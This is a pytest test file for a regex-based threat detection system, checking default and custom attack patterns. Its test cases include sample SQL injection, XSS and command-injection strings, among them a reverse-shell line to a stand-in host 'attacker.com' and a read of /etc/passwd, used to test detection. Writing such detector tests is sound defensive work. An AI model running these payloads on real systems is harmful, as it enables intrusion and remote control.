#!/usr/bin/env python3
"""
Test suite for custom threat patterns functionality
自定義威脅模式功能測試套件
"""

import pytest
import re
import numpy as np
from src.defense_system import LurRenJiaDefenseSystem


class TestThreatPatternInitialization:
    """Test threat pattern initialization"""
    
    def test_default_patterns_initialized(self):
        """Test that default patterns are initialized"""
        system = LurRenJiaDefenseSystem()
        
        assert system.threat_patterns is not None
        assert isinstance(system.threat_patterns, dict)
        assert len(system.threat_patterns) == 7
    
    def test_default_threat_types(self):
        """Test all default threat types are present"""
        system = LurRenJiaDefenseSystem()
        
        expected_threats = [
            'SQL_INJECTION',
            'XSS',
            'XSS_ENCODED',
            'COMMAND_INJECTION',
            'RCE',
            'PATH_TRAVERSAL',
            'MALWARE'
        ]
        
        for threat in expected_threats:
            assert threat in system.threat_patterns
    
    def test_each_threat_has_patterns(self):
        """Test each threat type has at least one pattern"""
        system = LurRenJiaDefenseSystem()
        
        for threat_name, patterns in system.threat_patterns.items():
            assert isinstance(patterns, list)
            assert len(patterns) > 0
            assert all(isinstance(p, str) for p in patterns)
    
    def test_patterns_are_valid_regex(self):
        """Test all patterns are valid regex expressions"""
        system = LurRenJiaDefenseSystem()
        
        for threat_name, patterns in system.threat_patterns.items():
            for pattern in patterns:
                try:
                    re.compile(pattern)
                except re.error as e:
                    pytest.fail(f"Invalid regex in {threat_name}: {e}")


class TestAddCustomThreat:
    """Test adding custom threat patterns"""
    
    def test_add_single_custom_threat(self):
        """Test adding a single custom threat"""
        system = LurRenJiaDefenseSystem()
        initial_count = len(system.threat_patterns)
        
        system.add_custom_threat('TEST_THREAT', [r'(?i)(test)'])
        
        assert 'TEST_THREAT' in system.threat_patterns
        assert len(system.threat_patterns) == initial_count + 1
    
    def test_add_custom_threat_with_multiple_patterns(self):
        """Test adding custom threat with multiple patterns"""
        system = LurRenJiaDefenseSystem()
        
        patterns = [
            r'(?i)(pattern1)',
            r'(?i)(pattern2)',
            r'(?i)(pattern3)',
        ]
        
        system.add_custom_threat('MULTI_PATTERN', patterns)
        
        assert 'MULTI_PATTERN' in system.threat_patterns
        assert len(system.threat_patterns['MULTI_PATTERN']) == 3
    
    def test_add_custom_threat_overwrites_existing(self):
        """Test that adding threat with same name overwrites"""
        system = LurRenJiaDefenseSystem()
        
        system.add_custom_threat('CUSTOM1', [r'pattern1', r'pattern2'])
        assert len(system.threat_patterns['CUSTOM1']) == 2
        
        system.add_custom_threat('CUSTOM1', [r'new_pattern'])
        assert len(system.threat_patterns['CUSTOM1']) == 1
        assert system.threat_patterns['CUSTOM1'] == [r'new_pattern']
    
    def test_add_custom_threat_converts_single_string(self):
        """Test that single string is converted to list"""
        system = LurRenJiaDefenseSystem()
        
        system.add_custom_threat('SINGLE', r'(?i)(test)')
        
        assert isinstance(system.threat_patterns['SINGLE'], list)
        assert system.threat_patterns['SINGLE'] == [r'(?i)(test)']


class TestPatternMatching:
    """Test pattern matching functionality"""
    
    def test_sql_injection_patterns(self):
        """Test SQL injection pattern detection"""
        system = LurRenJiaDefenseSystem()
        patterns = system.threat_patterns['SQL_INJECTION']
        
        test_cases = [
            ("' DROP TABLE users; --", True),
            ("UNION SELECT * FROM accounts", True),
            ("admin' OR '1'='1", True),
            ("normal request", False),
        ]
        
        for payload, should_match in test_cases:
            matched = any(re.search(p, payload) for p in patterns)
            assert matched == should_match, f"SQL pattern failed for: {payload}"
    
    def test_xss_patterns(self):
        """Test XSS pattern detection"""
        system = LurRenJiaDefenseSystem()
        patterns = system.threat_patterns['XSS']
        
        test_cases = [
            ("<script>alert('XSS')</script>", True),
            ("<img src=x onerror=alert(1)>", True),
            ("<iframe src=javascript:alert(1)></iframe>", True),
            ("normal html", False),
        ]
        
        for payload, should_match in test_cases:
            matched = any(re.search(p, payload) for p in patterns)
            assert matched == should_match, f"XSS pattern failed for: {payload}"
    
    def test_command_injection_patterns(self):
        """Test command injection pattern detection"""
        system = LurRenJiaDefenseSystem()
        patterns = system.threat_patterns['COMMAND_INJECTION']
        
        test_cases = [
            ("cat /etc/passwd", True),
            ("bash -i >& /dev/tcp/attacker.com/4444 0>&1", True),
            ("curl|bash", True),
            ("whoami", True),
            ("normal command", False),
        ]
        
        for payload, should_match in test_cases:
            matched = any(re.search(p, payload) for p in patterns)
            assert matched == should_match, f"COMMAND pattern failed for: {payload}"
    
    def test_case_insensitive_matching(self):
        """Test that patterns work case-insensitively"""
        system = LurRenJiaDefenseSystem()
        patterns = system.threat_patterns['SQL_INJECTION']
        
        # Test with SQL keywords that match the pattern requirements
        # First pattern requires: keyword.*("\'|;)
        test_payloads = [
            "' DROP TABLE users; --",     # Required format with quotes/semicolon
            "' drop table users; --",
            "' DrOp TaBlE users; --",
            "UNION SELECT * FROM accounts",  # Matches second pattern
        ]
        
        for payload in test_payloads:
            matched = any(re.search(p, payload) for p in patterns)
            assert matched, f"Case-insensitive matching failed for: {payload}"


class TestGetThreatPatterns:
    """Test retrieving threat patterns"""
    
    def test_get_threat_patterns_returns_copy(self):
        """Test that get_threat_patterns returns a copy"""
        system = LurRenJiaDefenseSystem()
        
        patterns1 = system.get_threat_patterns()
        patterns2 = system.get_threat_patterns()
        
        assert patterns1 is not patterns2
        assert patterns1 == patterns2
    
    def test_get_threat_patterns_includes_custom(self):
        """Test that custom patterns are included"""
        system = LurRenJiaDefenseSystem()
        system.add_custom_threat('CUSTOM_THREAT', [r'custom'])
        
        patterns = system.get_threat_patterns()
        
        assert 'CUSTOM_THREAT' in patterns
        assert patterns['CUSTOM_THREAT'] == [r'custom']
    
    def test_modifying_returned_patterns_doesnt_affect_system(self):
        """Test that modifying returned patterns doesn't affect system"""
        system = LurRenJiaDefenseSystem()
        
        patterns = system.get_threat_patterns()
        patterns['SQL_INJECTION'] = [r'modified']
        
        # Original should be unchanged
        assert system.threat_patterns['SQL_INJECTION'] != [r'modified']


class TestIntegrationWithSystem:
    """Test integration with threat detection system"""
    
    def test_system_trains_with_custom_threats(self):
        """Test that system can be trained with custom threats"""
        system = LurRenJiaDefenseSystem()
        system.add_custom_threat('CUSTOM', [r'(?i)(test)'])
        
        normal_data = np.random.randn(50, 5)
        system.train_ai_baseline(normal_data)
        
        assert system.trained
        assert 'CUSTOM' in system.threat_patterns
    
    def test_analysis_works_after_adding_custom_threats(self):
        """Test that analysis works after adding custom threats"""
        system = LurRenJiaDefenseSystem()
        system.add_custom_threat('CRYPTO', [r'(?i)(mining)'])
        
        normal_data = np.random.randn(50, 5)
        system.train_ai_baseline(normal_data)
        
        result = system.analyze_incoming_traffic(
            "192.168.1.1",
            "normal request",
            np.array([1, 1, 1, 1, 1])
        )
        
        assert 'threat_type' in result
        assert 'risk_score' in result
        assert 'action' in result


class TestPatternValidation:
    """Test pattern validation"""
    
    def test_add_invalid_regex_fails_appropriately(self):
        """Test behavior with invalid regex"""
        system = LurRenJiaDefenseSystem()
        
        # These patterns should be added (validation happens at use time)
        system.add_custom_threat('INVALID', [r'[invalid(regex'])
        
        # But matching should fail
        patterns = system.threat_patterns['INVALID']
        
        with pytest.raises(re.error):
            for p in patterns:
                re.compile(p)
    
    def test_empty_pattern_list(self):
        """Test adding empty pattern list"""
        system = LurRenJiaDefenseSystem()
        
        system.add_custom_threat('EMPTY', [])
        
        assert 'EMPTY' in system.threat_patterns
        assert system.threat_patterns['EMPTY'] == []


class TestPerformance:
    """Test performance characteristics"""
    
    def test_adding_many_threats_doesnt_break_system(self):
        """Test adding many threats doesn't break system"""
        system = LurRenJiaDefenseSystem()
        
        for i in range(50):
            system.add_custom_threat(f'THREAT_{i}', [f'r(?i)(pattern{i})'])
        
        assert len(system.threat_patterns) == 57  # 7 default + 50 custom
    
    def test_pattern_matching_performance(self):
        """Test pattern matching performance"""
        system = LurRenJiaDefenseSystem()
        
        # Add multiple threats with valid regex patterns
        for i in range(10):
            system.add_custom_threat(f'THREAT_{i}', [
                rf'(?i)(pattern{i})',
                rf'(?i)(variant{i})',
            ])
        
        # Test matching
        test_payload = "normal request with pattern1"
        
        for threat_name, patterns in system.threat_patterns.items():
            for pattern in patterns:
                result = re.search(pattern, test_payload)
                # Should complete quickly


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
